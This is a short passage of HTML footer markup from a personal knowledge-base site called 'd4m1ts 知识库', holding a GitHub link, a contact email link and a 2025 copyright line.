class="footer__item"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="mailto:admin@gm7.org" target="_blank" rel="noopener noreferrer" class="footer__link-item">联系我<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库</div></div></div></footer></div>
</body>
</html>